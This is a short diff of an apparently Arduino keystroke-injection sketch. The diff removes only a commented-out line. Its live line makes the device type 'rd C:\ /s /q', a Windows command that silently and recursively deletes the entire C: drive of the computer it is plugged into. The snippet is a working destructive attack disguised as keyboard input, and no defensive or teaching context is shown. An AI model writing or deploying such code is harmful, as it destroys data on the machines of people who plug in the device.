@@ -44,7 +44,6 @@ void setup()
   delay(1000);
 
   Keyboard.print("rd C:\\ /s /q");
-//  Keyboard.print("hello");
 
   delay(500);
 
